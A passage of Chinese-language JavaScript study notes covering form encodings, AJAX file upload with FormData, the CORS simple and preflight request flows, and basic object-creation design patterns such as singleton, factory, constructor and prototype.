第一种方法是默认方法，POST 发送，`Encoding type`为`application/x-www-form-urlencoded`。

```javascript
Content-Type: application/x-www-form-urlencoded

foo=bar&baz=The+first+line.&#37;0D%0AThe+second+line.%0D%0A
```

---

第二种方法是 POST 发送，`Encoding type`为`text/plain`。

```javascript
Content-Type: text/plain

foo=bar
baz=The first line.
The second line.
```

---

第三种方法是 POST 发送，`Encoding type`为`multipart/form-data`。

```javascript
Content-Type: multipart/form-data; boundary=---------------------------314911788813839

-----------------------------314911788813839
Content-Disposition: form-data; name="foo"

bar
-----------------------------314911788813839
Content-Disposition: form-data; name="baz"

The first line.
The second line.

-----------------------------314911788813839--
```

---

第四种方法是 GET 请求。

`?foo=bar&baz=The%20first%20line.%0AThe%20second%20line.`

---

通常，我们使用 file 控件实现文件上传。

```javascript
<form id="file-form" action="handler.php" method="POST">
  <input type="file" id="file-select" name="photos[]" multiple />
  <button type="submit" id="upload-button">
    上传
  </button>
</form>
```

上面 HTML 代码中，file 控件的`multiple`属性，指定可以一次选择多个文件；如果没有这个属性，则一次只能选择一个文件。

file 对象的`files`属性，返回一个`FileList`对象，包含了用户选中的文件。

```javascript
var fileSelect = document.getElementById("file-select");
var files = fileSelect.files;
```

然后，新建一个`FormData`对象的实例，用来模拟发送到服务器的表单数据，把选中的文件添加到这个对象上面。

```javascript
var formData = new FormData();

for (var i = 0; i < files.length; i++) {
  var file = files[i];

  if (!file.type.match("image.*")) {
    continue;
  }

  formData.append("photos[]", file, file.name);
}
```

上面代码中的`FormData`对象的`append`方法，除了可以添加文件，还可以添加二进制对象（Blob）或者字符串。

```javascript
// Files
formData.append(name, file, filename);

// Blobs
formData.append(name, blob, filename);

// Strings
formData.append(name, value);
```

`append`方法的第一个参数是表单的控件名，第二个参数是实际的值，第三个参数是可选的，通常是文件名。

最后，使用 Ajax 方法向服务器上传文件。

```javascript
var xhr = new XMLHttpRequest();

xhr.open("POST", "handler.php", true);

xhr.onload = function() {
  if (xhr.status !== 200) {
    alert("An error occurred!");
  }
};

xhr.send(formData);
```

> 目前，各大浏览器（包括 IE 10）都支持 Ajax 上传文件。

除了使用`FormData`接口上传，也可以直接使用 File API 上传。

```javascript
var file = document.getElementById("test-input").files[0];
var xhr = new XMLHttpRequest();

xhr.open("POST", "myserver/uploads");
xhr.setRequestHeader("Content-Type", file.type);
xhr.send(file);
```

可以看到，上面这种写法比 FormData 的写法，要简单很多。

### 8.CORS 通信

CORS 是一个 W3C 标准，全称是“跨域资源共享”（Cross-origin resource sharing）。

它允许浏览器向跨源服务器，发出 XMLHttpRequest 请求，从而克服了 AJAX 只能同源使用的限制。

#### 1.简介

CORS 需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE 浏览器不能低于 IE10。

整个 CORS 通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS 通信与同源的 AJAX 通信没有差别，代码完全一样。浏览器一旦发现 AJAX 请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。

因此，实现 CORS 通信的关键是服务器。只要服务器实现了 CORS 接口，就可以跨源通信。

#### 2.两种请求

浏览器将 CORS 请求分成两类：**简单请求（simple request）**和**非简单请求（not-so-simple request）**。

只要同时满足以下两大条件，就属于简单请求。

1).请求方法是以下三种方法之一。

---

- HEAD
- GET
- POST

---

2).HTTP 的头信息不超出以下几种字段。

---

- Accept
- Accept-Language
- Content-Language
- Last-Event-ID
- Content-Type：只限于三个值`application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain`

---

凡是不同时满足上面两个条件，就属于非简单请求。

浏览器对这两种请求的处理，是不一样的。

#### 3.简单请求

##### 3.1 基本流程

对于简单请求，浏览器直接发出 CORS 请求。具体来说，就是在头信息之中，增加一个`Origin`字段。

下面是一个例子，浏览器发现这次跨源 AJAX 请求是简单请求，就自动在头信息之中，添加一个`Origin`字段。

```javascript
GET /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

上面的头信息中，`Origin`字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。

如果`Origin`指定的源，不在许可范围内，服务器会返回一个正常的 HTTP 回应。浏览器发现，这个回应的头信息没有包含`Access-Control-Allow-Origin`字段，就知道出错了，从而抛出一个错误，被`XMLHttpRequest`的`onerror`回调函数捕获。

> 注意，这种错误无法通过状态码识别，因为 HTTP 回应的状态码有可能是 200。

如果`Origin`指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。

```javascript
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: FooBar
Content-Type: text/html; charset=utf-8
```

上面的头信息之中，有三个与 CORS 请求相关的字段，都以`Access-Control-`开头。

1).Access-Control-Allow-Origin

该字段是必须的。它的值要么是请求时`Origin`字段的值，要么是一个\*，表示接受任意域名的请求。

2).Access-Control-Allow-Credentials

该字段可选。它的值是一个布尔值，表示是否允许发送`Cookie`。默认情况下，`Cookie`不包括在 CORS 请求之中。设为 true，即表示服务器明确许可，`Cookie`可以包含在请求中，一起发给服务器。这个值也只能设为 true，如果服务器不要浏览器发送`Cookie`，删除该字段即可。

3).Access-Control-Expose-Headers

该字段可选。CORS 请求时，`XMLHttpRequest`对象的`getResponseHeader()`方法只能拿到 6 个基本字段：`Cache-Control`、`Content-Language`、`Content-Type`、`Expires`、`Last-Modified`、`Pragma`。如果想拿到其他字段，就必须在`Access-Control-Expose-Headers`里面指定。上面的例子指定，`getResponseHeader('FooBar')`可以返回`FooBar`字段的值。

##### 3.2 withCredentials 属性

上面说到，CORS 请求默认不包含`Cookie`信息（以及 HTTP 认证信息等）。如果需要包含`Cookie`信息，一方面要服务器同意，指定`Access-Control-Allow-Credentials`字段。

`Access-Control-Allow-Credentials: true`

另一方面，开发者必须在 AJAX 请求中打开`withCredentials`属性。

```javascript
var xhr = new XMLHttpRequest();
xhr.withCredentials = true;
```

否则，即使服务器同意发送`Cookie`，浏览器也不会发送。或者，服务器要求设置`Cookie`，浏览器也不会处理。

但是，如果省略`withCredentials`设置，有的浏览器还是会一起发送`Cookie`。这时，可以显式关闭`withCredentials`。

`xhr.withCredentials = false;`

需要注意的是，如果要发送`Cookie`，`Access-Control-Allow-Origin`就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，`Cookie`依然遵循同源政策，只有用服务器域名设置的`Cookie`才会上传，其他域名的`Cookie`并不会上传，且（跨源）原网页代码中的`document.cookie`也无法读取服务器域名下的`Cookie`。

#### 4.非简单请求

##### 4.1 预检请求

非简单请求是那种对服务器有特殊要求的请求，比如请求方法是 PUT 或 DELETE，或者`Content-Type`字段的类型是`application/json`。

非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为**预检（preflight）请求**。

浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些 HTTP 动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的`XMLHttpRequest`请求，否则就报错。

下面是一段浏览器的 JavaScript 脚本。

```javascript
var url = "http://api.alice.com/cors";
var xhr = new XMLHttpRequest();
xhr.open("PUT", url, true);
xhr.setRequestHeader("X-Custom-Header", "value");
xhr.send();
```

上面代码中，HTTP 请求的方法是 PUT，并且发送一个自定义头信息`X-Custom-Header`。

浏览器发现，这是一个非简单请求，就自动发出一个“预检”请求，要求服务器确认可以这样请求。下面是这个“预检”请求的 HTTP 头信息。

```javascript
OPTIONS /cors HTTP/1.1
Origin: http://api.bob.com
Access-Control-Request-Method: PUT
Access-Control-Request-Headers: X-Custom-Header
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

“预检”请求用的请求方法是 OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是`Origin`，表示请求来自哪个源。

除了`Origin`字段，“预检”请求的头信息包括两个特殊字段。

1).Access-Control-Request-Method

该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 PUT。

2).Access-Control-Request-Headers

该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是`X-Custom-Header`。

##### 4.2 预检请求的回应

服务器收到“预检”请求以后，检查了`Origin`、`Access-Control-Request-Method`和`Access-Control-Request-Headers`字段以后，确认允许跨源请求，就可以做出回应。

```javascript
HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2.0.61 (Unix)
Access-Control-Allow-Origin: http://api.bob.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-Custom-Header
Content-Type: text/html; charset=utf-8
Content-Encoding: gzip
Content-Length: 0
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain
```

上面的 HTTP 回应中，关键的是`Access-Control-Allow-Origin`字段，表示`http://api.bob.com`可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。

`Access-Control-Allow-Origin: *`

如果服务器否定了“预检”请求，会返回一个正常的 HTTP 回应，但是没有任何 CORS 相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被`XMLHttpRequest`对象的`onerror`回调函数捕获。控制台会打印出如下的报错信息。

```javascript
XMLHttpRequest cannot load http://api.alice.com.
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.
```

服务器回应的其他 CORS 相关字段如下。

```javascript
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: X-Custom-Header
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1728000
```

1).Access-Control-Allow-Methods

该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次“预检”请求。

2).Access-Control-Allow-Headers

如果浏览器请求包括`Access-Control-Request-Headers`字段，则`Access-Control-Allow-Headers`字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在“预检”中请求的字段。

3).Access-Control-Allow-Credentials

该字段与简单请求时的含义相同。

4).Access-Control-Max-Age

该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 20 天（1728000 秒），即允许缓存该条回应 1728000 秒（即 20 天），在此期间，不用发出另一条预检请求。

##### 4.3 浏览器的正常请求和回应

一旦服务器通过了“预检”请求，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个`Origin`头信息字段。服务器的回应，也都会有一个`Access-Control-Allow-Origin`头信息字段。

下面是“预检”请求之后，浏览器的正常 CORS 请求。

```javascript
PUT /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
X-Custom-Header: value
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
```

上面头信息的 Origin 字段是浏览器自动添加的。

下面是服务器正常的回应。

```javascript
Access-Control-Allow-Origin: http://api.bob.com
Content-Type: text/html; charset=utf-8
```

上面头信息中，`Access-Control-Allow-Origin`字段是每次回应都必定包含的。

#### 5.与 JSONP 的比较

CORS 与 JSONP 的使用目的相同，但是比 JSONP 更强大。

JSONP 只支持 GET 请求，CORS 支持所有类型的 HTTP 请求。JSONP 的优势在于支持老式浏览器，以及可以向不支持 CORS 的网站请求数据。

## 9.设计模式

### 1.单例模式

在 JavaScript 中，单例模式是最基本也是最重要的模式之一，这种模式提供了一种将代码组织为一个逻辑单元的手段。（单例模式可以用来划分命名空间，从而减少全局变量的数量）

在开发的时候，为了对人合作开发而使用变量的冲突问题，我们可以将变量以属性的方式写在对象中，只要对象名不冲突即可，这时我们给每个对象添加一个新的名字叫做**命名空间**；

将每个模块写在对象中的形式就是单例模式；

新单例模式，对象内用自执行函数来返回方法；

```javascript
var public = (function() {
  function toArray(likeArray) {
    return [...likeArray];
  }

  function children(ele, tag) {
    var kid = ele.children;
    var ary = [];
    for (var i = 0; i < kid.length; i++) {
      if (kid[i].tagName === tag.toUpperCase()) {
        ary.push(kid[i]);
      }
    }
    return ary;
  }

  function prevAll(ele) {
    var ary = [];
    var prev = ele.previousElementSibling;
    while (prev) {
      ary.unshift(prev);
      prev = prev.previousElementSibling;
    }
    return ary;
  }
  return {
    toArray: toArray,
    children: children,
    prevAll: prevAll
  };
})();
```

> 在自己的模块中使用自己的方法属性，可以直接用`this`代替对象名；

### 2.工厂模式

我们把一些功能封装成一个函数，以后再想实现这个功能只需要取执行这个函数即可；

工厂模式用于批量生产；提供不同的原材料（传入参数），得到不一样的产品（返回值）；

### 3.构造函数

为了解决工厂模式的实例识别，使用构造函数；构造函数与其他函数唯一的区别，就在于调用他们的方式不同；

把一个函数变成类，或者说添加一个自定义的类，通过构造函数来实现；

按照惯例，构造函数始终都应该以一个大写字母开头，非构造函数以小写字母开头，主要是为了区别于其他函数；因为构造函数本身也是函数，只不过可以用来创建对象而已。

> 使用`new`关键字来创建构造函数，该函数就是一个类，此时的 this 指代被定义产生的实例，可以通过`this.`的形式可以给实例添加私有的属性和方法；不需要`return`，默认会将`this`返回；

> 如果要在类中设置`return`返回：若`return`返回值是引用类型会改变返回值（返回`return`的值）；若`return`返回值是基本数据类型，不会造成影响；

`实例 instanceof 类`判断某个对象是不是某个类的实例；对基本数据类型，需是构造函数产生的才是实例；对引用类型皆可；

创建自定义的构造函数意味着将来可以将他的实例标识为一种特定类型；而这正是构造函数模式胜过工厂模式的地方。

### 4.原型模式

实例的共享属性和方法存在于原型对象中；

构造函数无法解决复用问题，因为私有，所以实例之间无法共用一个系统的方法；而用 Js 的原型机制可以实现，这就是 js 面向对象的核心点；

**所有类都是函数；每个函数都有一个`prototype`（原型）属性**，是一个对象（当前类本身），这个属性类似于一个指针，指向一个特定类型的所有实例所共享的属性和方法。构造函数和实例的 prototype 属性都指向同一个原型对象，原型对象的方法都可以由实例取继承；

`Constructor`属性是原型对象的属性，是一个对象（当前类本身），也是一个指针，指向构造函数；大部分情况下指向构造函数，但也不少一成不变的。当构造函数的`prototype`设置为等于一个以对象字面量形式创建的新对象时，此时`Constructor`属性不再指向构造函数，而是指向对象；

**任意一个对象都会有一个属性`__proto__`**，这个属性指向所属类的原型（`prototype`）；Objectd 的原型上没有`__proto__`，因为已指向自身;

### 5.混合模式

利用构造函数模式优秀的识别功能来为对象添加属性，利用原型模式的高效共享功能来为对象添加方法。
